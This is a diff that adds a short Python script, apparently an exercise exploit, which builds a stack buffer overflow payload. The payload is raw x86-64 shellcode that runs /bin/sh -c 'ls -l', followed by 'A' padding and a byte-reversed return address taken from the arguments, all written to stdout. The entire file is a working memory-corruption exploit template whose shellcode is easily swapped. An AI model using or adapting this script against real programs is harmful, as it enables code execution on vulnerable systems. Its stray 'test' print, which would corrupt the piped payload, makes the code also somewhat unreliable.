@@ -1,0 +1,17 @@
+#!/usr/bin/python
+import sys
+import codecs
+import os
+print("test")
+if len(sys.argv)==3:
+    address=codecs.decode(sys.argv[1], "hex")
+    address=address [::-1]
+    padding_size = int(sys.argv [2])
+else:
+    print("Usage:", sys.argv[0], "address padding_size")
+    sys.exit (1)
+
+shellcode = b"\x48\x31\xc9\x51\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe9\x08\x51\x54\x5f\x48\x31\xc9\x51\x66\x68\x2d\x63\x54\x5b\x48\x31\xc9\x51\xeb\x14\x5a\x52\x80\x72\x05\x41\x53\x57\x54\x5e\x48\x31\xc0\xb0\x3b\x48\x31\xd2\x0f\x05\xe8\xe7\xff\xff\xff\x6c\x73\x20\x2d\x6c\x41"
+data = shellcode + b"A" * padding_size + address
+# Write to file descriptor 1 (stdout)
+os.write(1,data)
